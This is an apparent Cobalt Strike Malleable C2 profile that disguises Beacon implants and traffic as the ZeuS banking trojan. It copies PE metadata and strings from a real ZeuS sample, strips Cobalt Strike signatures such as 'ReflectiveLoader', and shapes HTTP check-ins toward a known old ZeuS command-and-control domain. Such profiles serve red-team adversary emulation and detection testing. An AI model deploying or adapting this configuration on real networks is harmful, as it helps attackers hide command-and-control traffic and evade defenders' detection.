#
# ZeuS Sample Profile
#   client - https://malwr.com/analysis/NjIwNTU2ODA2OTUxNDcwNmJiMTMzYzk4YzU4NWQyZDQ/
#   server - http://malware-traffic-analysis.net/2014/04/05/index.html
#
# Author: @harmj0y
#
set sample_name "ZeuS";

set sleeptime "30000";
set jitter    "5";
set maxdns    "255";
set useragent "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1)";

# Sample from: https://malshare.com/sample.php?action=detail&hash=1da10c6412b79fe8ffcbb5d1901144ee
stage {
	# ./peclone 1da10c6412b79fe8ffcbb5d1901144ee
	set checksum       "0";
	set compile_time   "24 Mar 2011 07:36:23";
	set entry_point    "93589";
	set rich_header    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	set stomppe        "false";

	# strings -e l 1da10c6412b79fe8ffcbb5d1901144ee
	stringw "nspr4.dll";
	stringw ".tmp";
	stringw "DISPLAY";
	stringw "SeShutdownPrivilege";
	stringw "cGlobal\\%08X%08X%08X";
	stringw "TSeTcbPrivilege";
	stringw ".exe";
	stringw "SOFTWARE\\Microsoft";
	stringw "SysListView32";
	stringw "MDIClient";
	stringw "CiceroUIWndFrame";
	stringw "ConsoleWindowClass";
	stringw "#32768";
	stringw "SysShadow";
	stringw "e.dat";
	stringw "kernel32.dll";
	stringw "\"%s\"";
	stringw "\"%s\" %s";
	stringw "/c \"%s\"";
	stringw "ComSpec";
	stringw "S:(ML;;NRNWNX;;;LW)";
	stringw "SeSecurityPrivilege";
	stringw "S:(ML;CIOI;NRNWNX;;;LW)";
	stringw "Global\\";
	stringw "Local\\";
	stringw "%s%08x.%s";
	stringw "%s%08x";

	# strings 1da10c6412b79fe8ffcbb5d1901144ee
	string "del \"%s\"";
	string "if exist \"%s\" goto d";
	string "@echo off";
	string "del /F \"%s\"";

	# get rid of some standard Cobalt Strike stuff.
	transform-x86 {
		strrep "beacon.dll" "";
		strrep "ReflectiveLoader" "";
	}

	transform-x64 {
		strrep "beacon.x64.dll" "";
		strrep "ReflectiveLoader" "";
	}
}

http-get {

    set uri "/metro91/admin/1/ppptp.jpg";

    client {

        header "Accept" "*/*";
        header "Connection" "Close";

        # throw in a known/old Zeus C2 domain
        header "Host" "mahamaya1ifesciences.com";
        header "Cache-Control" "no-cache";
        
        metadata {
            base64;
            header "Cookie";
        }
    }

    server {
        header "Server" "nginx/1.0.4";
        header "Content-Type" "text/html";
        header "Connection" "close";
        header "X-Powered-By" "PHP/5.3.8-1~dotdeb.2";

        output {
            print;
        }
    }
}

http-post {

    set uri "/metro91/admin/1/secure.php";

    client {

        header "Accept" "*/*";
        header "Connection" "Keep-Alive";

        # throw in a known/old Zeus C2 domain
        header "Host" "mahamaya1ifesciences.com";
        header "Cache-Control" "no-cache";

        id {
            netbios;
            parameter "id";
        }

        output {
            print;
        }
    }

    server {
        header "Server" "nginx/1.0.4";
        header "Content-Type" "text/html";
        header "Connection" "close";
        header "X-Powered-By" "PHP/5.3.8-1~dotdeb.2";

        output {
            print;
        }
    }
}

